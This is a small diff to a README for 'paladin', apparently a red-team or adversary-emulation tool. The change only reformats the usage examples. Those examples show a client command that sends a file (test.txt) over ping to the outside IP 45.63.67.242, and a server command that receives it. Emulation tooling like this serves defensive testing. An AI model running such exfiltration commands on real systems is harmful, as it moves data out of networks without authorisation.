@@ -30,12 +30,12 @@ Use "paladin exfil ping [command] --help" for more information about a command.
 #### Basic Usage
 Client
 
-```
-# paladin exfil ping -d 45.63.67.242 -f test.txt
+```console
+$ paladin exfil ping -d 45.63.67.242 -f test.txt
 ```
 
 Server
-```
+```console
 $ paladin exfil ping receive -i ens3
 ```
 ### Atomic Red Team
